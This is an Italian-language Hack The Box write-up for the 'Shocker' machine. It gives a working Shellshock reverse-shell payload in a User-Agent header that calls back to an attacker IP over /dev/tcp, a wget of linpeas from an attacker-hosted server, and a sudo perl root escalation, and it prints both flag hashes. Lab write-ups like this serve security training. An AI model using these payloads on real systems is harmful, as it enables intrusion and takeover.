![](shocker.png)
# Shocker -Hack The Box Writeup

## Nmap scan
```bash
nmap -sCV -O iptarget
```
## Dirbuster
```bash
enumeriamo le directory con dirbuster
troviamo la directorty cgi-bin
facendo un enumerazione file partendo da quest'ultima troveremo user.sh
```
## Netcat
```bash
nc -lnvp 4444
```
## Burpsuite
```bash
utilizziamo burpsuite intercettando la richiesta a user.sh
inseriamo ora il payload
 User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.130/4444 0>&1
```
navigando nella cartella /home
catturiamo il primo flag
```bash
cat user.txt
```
# Flaguser
## 4f6684110276b5bc24f3542d08d3f279

# PrivilegeEscalation

## Linpeas

nella nostra macchina avviamo un server python all'interno della cartella di linpeas
```bash
python -m http.server 8081
```
inserendoci nella cartella dei file temporanei
```bash
cd /tmp
```
```bash
wget http://ipmacchina:8081/linpeas.sh
```
avviamo linpeas
```bash
chmod +x linpeas.sh
./linpeas.sh
```
ci accorgiamo che la macchina ha una vulnerabilita su Perl

## Privilege escalation
```bash
sudo perl -e 'exec "/bin/sh"'
```
```bash
whoami
root
cd root
cat root.txt
```

# Flagroot
## 241c7aa1564a58cb50aceb96a00542eb
